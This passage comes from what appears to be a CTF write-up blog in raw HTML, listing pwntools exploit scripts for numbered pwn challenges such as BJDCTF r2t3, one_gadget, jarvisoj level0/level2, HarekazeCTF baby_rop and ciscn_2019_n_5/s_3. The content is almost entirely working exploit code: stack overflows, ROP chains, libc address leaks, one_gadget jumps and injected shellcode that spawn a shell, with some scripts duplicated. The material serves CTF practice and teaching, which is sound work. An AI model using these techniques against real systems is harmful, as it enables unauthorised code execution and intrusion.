class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">print p.recvline()    </span></span><br><span class="line"><span class="string">print p.recvline()   </span></span><br><span class="line"><span class="string">print p.recvline()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;@\n&#x27;</span>)</span><br><span class="line">offest = u64(p.recvline().strip().ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">system_addr = libc.sym[<span class="string">&#x27;system&#x27;</span>] + offest</span><br><span class="line">bin_addr = libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>() + offest</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x00000000004006b9</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span>*padding+ p64(ret) + p64(pop_rdi_addr) + p64(bin_addr) + p64(system_addr) </span><br><span class="line">send(payload1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-15-BJDCTF2nd-r2t3-solve"><a href="#NO-15-BJDCTF2nd-r2t3-solve" class="headerlink" title="NO.15 [BJDCTF2nd]r2t3_solve"></a>NO.15 [BJDCTF2nd]r2t3_solve</h1><h3 id="exp-15"><a href="#exp-15" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./[BJDCTF 2nd]r2t3&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29466</span>)</span><br><span class="line"></span><br><span class="line">system_addr=<span class="number">0x0804858B</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x9</span>+<span class="number">0x4</span>) + p32(system_addr) + <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x103</span>-<span class="number">0x15</span>-<span class="number">0x4</span>) </span><br><span class="line"><span class="comment"># 绕过范围 (3,8]，0x103 ~ 0x107 使用p.sendline()發送時多了一個換行符號 所以 0x103也可。</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;[+]Please input your name:\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-16-BJDCTF2nd-r2t3-solve"><a href="#NO-16-BJDCTF2nd-r2t3-solve" class="headerlink" title="NO.16 BJDCTF2nd_r2t3_solve"></a>NO.16 BJDCTF2nd_r2t3_solve</h1><h3 id="exp-16"><a href="#exp-16" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./[BJDCTF 2nd]r2t3&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29466</span>)</span><br><span class="line"></span><br><span class="line">system_addr=<span class="number">0x0804858B</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x9</span>+<span class="number">0x4</span>) + p32(system_addr) + <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x103</span>-<span class="number">0x15</span>-<span class="number">0x4</span>) </span><br><span class="line"><span class="comment"># 绕过范围 (3,8]，0x103 ~ 0x107 使用p.sendline()發送時多了一個換行符號 所以 0x103也可。</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;[+]Please input your name:\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-17-BJDCTF2nd-one-gadget-solve"><a href="#NO-17-BJDCTF2nd-one-gadget-solve" class="headerlink" title="NO.17 [BJDCTF2nd]one_gadget_solve"></a>NO.17 [BJDCTF2nd]one_gadget_solve</h1><h3 id="exp-17"><a href="#exp-17" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./[BJDCTF 2nd]one_gadget&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28292</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;[BJDCTF 2nd]one_gadget&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.29.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">one_gadget = [<span class="number">0xe237f</span>,<span class="number">0xe2383</span>,<span class="number">0xe2386</span>,<span class="number">0x106ef8</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;:0x&quot;</span>)</span><br><span class="line">printf_addr = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>),<span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offest = printf_addr - libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = one_gadget[<span class="number">3</span>] + offest</span><br><span class="line">p.sendline(<span class="built_in">str</span>(payload))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-18-BJDCTF2nd-one-gadget-solve"><a href="#NO-18-BJDCTF2nd-one-gadget-solve" class="headerlink" title="NO.18 BJDCTF2nd_one_gadget_solve"></a>NO.18 BJDCTF2nd_one_gadget_solve</h1><h3 id="exp-18"><a href="#exp-18" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./[BJDCTF 2nd]one_gadget&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28292</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;[BJDCTF 2nd]one_gadget&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.29.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">one_gadget = [<span class="number">0xe237f</span>,<span class="number">0xe2383</span>,<span class="number">0xe2386</span>,<span class="number">0x106ef8</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;:0x&quot;</span>)</span><br><span class="line">printf_addr = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>),<span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offest = printf_addr - libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = one_gadget[<span class="number">3</span>] + offest</span><br><span class="line">p.sendline(<span class="built_in">str</span>(payload))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-19-jarvisoj-level0-solve"><a href="#NO-19-jarvisoj-level0-solve" class="headerlink" title="NO.19 jarvisoj_level0_solve"></a>NO.19 jarvisoj_level0_solve</h1><h3 id="exp-19"><a href="#exp-19" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./jarvisoj_level0&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;node3.buuoj.cn&#x27;,27617)</span></span><br><span class="line">system_addr = <span class="number">0x400460</span></span><br><span class="line">binsh_addr = <span class="number">0x040059A</span></span><br><span class="line">sysfuntions_addr= <span class="number">0x00400596</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload = &#x27;a&#x27;*(0x80+8) + p64(sysfuntions_addr) # solve1</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x80</span> +p64(system_addr) +p64(binsh_addr) <span class="comment"># solve2</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-20-HarekazeCTF2019-baby-rop-solve"><a href="#NO-20-HarekazeCTF2019-baby-rop-solve" class="headerlink" title="NO.20 [HarekazeCTF2019]baby_rop_solve"></a>NO.20 [HarekazeCTF2019]baby_rop_solve</h1><h3 id="exp-20"><a href="#exp-20" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./[HarekazeCTF2019]baby_rop&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27724</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;[HarekazeCTF2019]baby_rop&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;&#x27;)</span></span><br><span class="line">system_addr = <span class="number">0x00400490</span></span><br><span class="line">system_addr1 = <span class="number">0x04005E3</span></span><br><span class="line">sh_addr = <span class="number">0x0601048</span></span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400683</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>) + p64(pop_rdi) + p64(sh_addr) + p64(system_addr)</span><br><span class="line"><span class="comment">#payload = &#x27;a&#x27;*(0x10+8) + p64(pop_rdi) + p64(sh_addr)+ p64(system_addr1)</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;What&#x27;s your name? &quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-21-HarekazeCTF2019-baby-rop-solve"><a href="#NO-21-HarekazeCTF2019-baby-rop-solve" class="headerlink" title="NO.21 HarekazeCTF2019_baby_rop_solve"></a>NO.21 HarekazeCTF2019_baby_rop_solve</h1><h3 id="exp-21"><a href="#exp-21" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./[HarekazeCTF2019]baby_rop&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27724</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;[HarekazeCTF2019]baby_rop&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;&#x27;)</span></span><br><span class="line">system_addr = <span class="number">0x00400490</span></span><br><span class="line">system_addr1 = <span class="number">0x04005E3</span></span><br><span class="line">sh_addr = <span class="number">0x0601048</span></span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400683</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>) + p64(pop_rdi) + p64(sh_addr) + p64(system_addr)</span><br><span class="line"><span class="comment">#payload = &#x27;a&#x27;*(0x10+8) + p64(pop_rdi) + p64(sh_addr)+ p64(system_addr1)</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;What&#x27;s your name? &quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-22-jarvisoj-level2-solve"><a href="#NO-22-jarvisoj-level2-solve" class="headerlink" title="NO.22 jarvisoj_level2_solve"></a>NO.22 jarvisoj_level2_solve</h1><h3 id="exp-22"><a href="#exp-22" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./jarvisoj_level2&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29779</span>)</span><br><span class="line"><span class="comment">#elf = ELF(&#x27;&#x27;)</span></span><br><span class="line"><span class="comment">#libc = ELF(&#x27;&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">system_addr = <span class="number">0x804845C</span></span><br><span class="line">system_addr1 = <span class="number">0x08048320</span></span><br><span class="line">binsh_addr = <span class="number">0x0804A024</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(system_addr)+p32(binsh_addr)</span><br><span class="line"><span class="comment">#payload = &#x27;a&#x27;*(0x88+4)+p32(system_addr1)+&#x27;bbbb&#x27;+p32(binsh_addr)</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-23-bjdctf-2020-babystack-solve"><a href="#NO-23-bjdctf-2020-babystack-solve" class="headerlink" title="NO.23 bjdctf_2020_babystack_solve"></a>NO.23 bjdctf_2020_babystack_solve</h1><h3 id="exp-23"><a href="#exp-23" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./bjdctf_2020_babystack&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26095</span>)</span><br><span class="line"><span class="comment">#elf = ELF(&#x27;bjdctf_2020_babystack&#x27;)</span></span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/libc/ubuntu16/64/libc-2.23.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">binsh_addr = <span class="number">0x0004006E6</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x10</span>) +p64(<span class="number">0x123123</span>)+ p64(binsh_addr)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;Please input the length of your name:\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">123123</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;What&#x27;s u name?\n&quot;</span>,payload+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-24-ciscn-2019-n-5-solve"><a href="#NO-24-ciscn-2019-n-5-solve" class="headerlink" title="NO.24 ciscn_2019_n_5_solve"></a>NO.24 ciscn_2019_n_5_solve</h1><h3 id="exp-24"><a href="#exp-24" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./ciscn_2019_n_5&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27053</span>)</span><br><span class="line"><span class="comment">#elf = ELF(&#x27;&#x27;)</span></span><br><span class="line"><span class="comment">#libc = ELF(&#x27;&#x27;)</span></span><br><span class="line"></span><br><span class="line">name_addr = <span class="number">0x00601080</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;tell me your name&#x27;</span>,shellcode+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>) + p64(name_addr)</span><br><span class="line">p.sendafter(<span class="string">&#x27;What do you want to say to me?&#x27;</span>,payload+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-25-ciscn-2019-s-3-solve"><a href="#NO-25-ciscn-2019-s-3-solve" class="headerlink" title="NO.25 ciscn_2019_s_3_solve"></a>NO.25 ciscn_2019_s_3_solve</h1><h3 id="exp-25"><a href="#exp-25" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./ciscn_2019_s_3&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25585</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;ciscn_2019_s_3&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;&#x27;)</span></span><br><span class="line"></span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"><span class="comment">#main=0x0004004ED</span></span><br><span class="line">execv = <span class="number">0x04004E2</span></span><br><span class="line">pop_rdi = <span class="number">0x4005a3</span></span><br><span class="line">pop_rbx_rbp_r12_r13_r14_r15 = <span class="number">0x40059A</span></span><br><span class="line">mov_rdxr13_call = <span class="number">0x0400580</span> </span><br><span class="line">syscall = <span class="number">0x00400517</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;/bin/sh\00&#x27;</span>*<span class="number">2</span> + p64(main)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">binsh_addr = u64(p.recv(<span class="number">8</span>)) - <span class="number">0x138</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(binsh_addr))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">payload = <span class="string">&#x27;/bin/sh\00&#x27;</span>*<span class="number">2</span> + p64(pop_rbx_rbp_r12_r13_r14_r15) </span><br><span class="line">payload += p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(binsh_addr+<span class="number">0x50</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(mov_rdxr13_call)+p64(execv)</span><br><span class="line">payload += p64(pop_rdi)+p64(binsh_addr)+p64(syscall)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span 